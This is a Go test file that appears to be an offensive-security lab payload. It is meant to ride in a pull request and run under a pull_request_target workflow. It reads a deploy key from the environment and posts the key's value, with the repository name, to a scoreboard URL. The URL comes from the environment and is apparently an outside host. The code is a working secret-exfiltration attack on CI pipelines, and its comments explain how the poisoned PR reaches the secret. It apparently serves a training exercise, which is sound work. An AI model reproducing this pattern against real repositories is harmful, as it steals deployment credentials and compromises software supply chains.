package test

// PR-head beacon probe for the Devcon offsec lab.
//
// This file is the payload carried by an otherwise-innocent PR. It proves that
// the integration-deploy workflow (on pull_request_target) checks out and runs
// PR-head code with the production deploy key in scope. The test reads
// FAKE_PROD_DEPLOY_KEY from the environment; if the key is absent the test
// fails, which is what makes a passing run an assertion that PR-head code
// executed with the secret present.
//
// It does not print the secret value.

import (
	"bytes"
	"encoding/json"
	"net/http"
	"os"
	"testing"
)

func TestPrHeadBeacon(t *testing.T) {
	key := os.Getenv("FAKE_PROD_DEPLOY_KEY")
	if key == "" {
		t.Fatal("FAKE_PROD_DEPLOY_KEY absent: PR-head code did NOT see the deploy key")
	}
	t.Logf("PR-head code ran with FAKE_PROD_DEPLOY_KEY present (len=%d)", len(key))

	url := os.Getenv("SCOREBOARD_URL")
	token := os.Getenv("SCOREBOARD_TOKEN")
	if url == "" || token == "" {
		// The integration-deploy test step maps only FAKE_PROD_DEPLOY_KEY and
		// BOT_TOKEN, so the dispatch token is not reachable from here. The
		// workflow's own beacon step lands the pr-head-ci row; this branch
		// records that a PR-head test could not self-dispatch from this step.
		t.Log("SCOREBOARD_URL/SCOREBOARD_TOKEN not in this step's env; workflow beacon step lands the row")
		return
	}

	payload := map[string]any{
		"event_type": "beacon",
		"client_payload": map[string]string{
			"team":     os.Getenv("GITHUB_REPOSITORY"),
			"kind":     "pr-head-ci",
			"secret":   key,
			"workflow": "pr-head-go-test",
			"detail":   "from=pr-head-go-test",
		},
	}
	body, err := json.Marshal(payload)
	if err != nil {
		t.Fatal(err)
	}
	req, err := http.NewRequest(http.MethodPost, url, bytes.NewReader(body))
	if err != nil {
		t.Fatal(err)
	}
	req.Header.Set("Authorization", "token "+token)
	req.Header.Set("Accept", "application/vnd.github+json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 {
		t.Fatalf("beacon dispatch failed: %s", resp.Status)
	}
	t.Log("pr-head beacon dispatched from PR-head Go test")
}
